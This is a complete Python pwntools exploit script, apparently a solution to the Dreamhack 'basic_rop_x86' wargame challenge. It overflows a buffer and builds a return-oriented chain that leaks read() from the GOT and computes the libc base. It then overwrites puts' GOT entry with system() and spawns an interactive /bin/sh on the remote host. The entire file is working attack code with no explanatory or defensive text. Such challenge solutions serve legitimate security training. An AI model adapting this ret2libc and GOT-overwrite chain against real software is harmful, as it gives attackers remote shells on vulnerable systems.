from os import system
from pwn import *
# nc host2.dreamhack.games 10085
p = remote("host2.dreamhack.games", 10085)
# p = process("./basic_rop_x86")
libc = ELF("./libc.so.6")
e = ELF("./basic_rop_x86")

pr_gadget = 0x080483d9
pppr_gadget = 0x08048689

read_plt = e.plt['read']
read_got = e.got['read']

puts_plt = e.plt['puts']
puts_got = e.got['puts']

# input()

pay = b""
pay += b"A" * 0x40
pay += b"X" * 4 # sfp
pay += b"X" * 4 # sfp
pay += p32(puts_plt) # 
pay += p32(pr_gadget)
pay += p32(read_got)  # arg

pay += p32(read_plt)
pay += p32(pppr_gadget)
pay += p32(0)
pay += p32(puts_got)
pay += p32(12)

pay += p32(puts_plt)
pay += p32(pr_gadget)
pay += p32(puts_got + 4)


p.send(pay)

p.recvuntil(b"A" * 0x40)
read_arr = u32(p.recv(4))
# libc_base = read_arr - 0xd5c20
# sys_arr = libc_base + 0x3adb0
libc_base = read_arr - libc.symbols['read']
sys_arr = libc_base + libc.symbols['system']
print("[+] read_arr: " + hex(read_arr))
print("[+] libc_base: " + hex(libc_base))
print("[+] system: " + hex(sys_arr))

p.send(p32(sys_arr) + b"/bin/sh\x00")


p.interactive()